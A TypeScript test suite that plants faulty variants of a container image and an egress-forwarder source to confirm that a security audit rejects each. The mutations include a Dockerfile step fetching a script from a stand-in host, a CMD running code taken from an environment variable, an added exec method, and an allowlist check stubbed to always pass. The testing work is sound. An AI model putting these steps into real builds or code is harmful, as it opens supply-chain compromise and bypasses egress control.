// Planted reds for gate:egress-interception's forwarder admission: the live CodexEgress passes, and each mutation of
// one proof keeps a container in the interception set.
import { describe, expect, test } from 'bun:test';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { CONTAINER_IMAGES, imageReference, readSource, sourceHash } from './container-images';
import { auditForwarder, type ForwarderInputs } from './egress-interception';

const REPO = join(import.meta.dir, '..');

const FILE = 'packages/cf-backend/src/egress/codex-egress.ts';

const IMAGE = CONTAINER_IMAGES.CodexEgress;

const DOCKERFILE = `${IMAGE.source}/Dockerfile`;

function live(): ForwarderInputs {
  return {
    owner: 'CodexEgress',
    file: FILE,
    fileText: readFileSync(join(REPO, FILE), 'utf8'),
    image: IMAGE,
    boundImage: imageReference(IMAGE),
    sourceFiles: readSource(REPO, IMAGE.source),
  };
}

/** The live inputs with one source file rewritten and its hash recorded, so only the proof under test fails. */
function withFile(path: string, rewrite: (text: string) => string): ForwarderInputs {
  const files = new Map(live().sourceFiles);
  files.set(path, rewrite(String(files.get(path) ?? '')));

  return { ...live(), sourceFiles: files, image: { ...IMAGE, sourceHash: sourceHash(files) } };
}

describe('a direct Container is admitted only with all three proofs', () => {
  test('the live CodexEgress is admitted', () => {
    expect(auditForwarder(live())).toEqual([]);
  });

  test('(a) no record, a moved source, or a different bound image keeps it in the set', () => {
    expect(auditForwarder({ ...live(), image: undefined })).toHaveLength(1);

    const moved = new Map(live().sourceFiles);
    moved.set(`${IMAGE.source}/server.mjs`, `${String(moved.get(`${IMAGE.source}/server.mjs`))}\n// edited after the push\n`);
    expect(auditForwarder({ ...live(), sourceFiles: moved }).join('\n')).toContain('no longer hashes');

    expect(auditForwarder({ ...live(), boundImage: `${IMAGE.repository}@sha256:${'0'.repeat(64)}` }).join('\n')).toContain('is bound to');
  });

  test('(b) a build step, an untracked copy, an unpinned base or a foreign CMD keeps it in the set', () => {
    const cases: ReadonlyArray<readonly [string, (text: string) => string]> = [
      ['runs `RUN`', (text) => text.replace('USER node', 'RUN wget https://example.com/agent.js\nUSER node')],
      ['not a tracked file', (text) => text.replace('COPY server.mjs .', 'COPY server.mjs agent.js .')],
      ['not a pinned digest', (text) => text.replace(/^FROM .*$/mu, 'FROM node:22-alpine')],
      ['not one tracked script', (text) => text.replace(/^CMD .*$/mu, 'CMD ["node", "-e", "require(process.env.CODE)"]')],
    ];

    for (const [reason, rewrite] of cases) {
      expect({ reason, reasons: auditForwarder(withFile(DOCKERFILE, rewrite)).join('\n').includes(reason) }).toEqual({ reason, reasons: true });
    }
  });

  test('(c) an exec, a fetch before the check, or a check of a local predicate keeps it in the set', () => {
    const text = live().fileText;

    const cases: ReadonlyArray<readonly [string, string]> = [
      ['uses `exec`', text.replace('  cancel(callId: string): void {', '  async run(command: string) { return this.exec(command); }\n\n  cancel(callId: string): void {')],
      ['no refusing check', text.replace("if (!codexEgressAllowed({ method: request.method, url: request.url })) {", 'if (!request.url) {')],
      ['no refusing check', text.replace("import { codexEgressAllowed, EgressCalls } from '@kinu.run/core';", "import { EgressCalls } from '@kinu.run/core';\nconst codexEgressAllowed = (_: unknown): boolean => true;")],
    ];

    for (const [reason, fileText] of cases) {
      expect(fileText).not.toBe(text);
      expect({ reason, found: auditForwarder({ ...live(), fileText }).join('\n').includes(reason) }).toEqual({ reason, found: true });
    }
  });
});
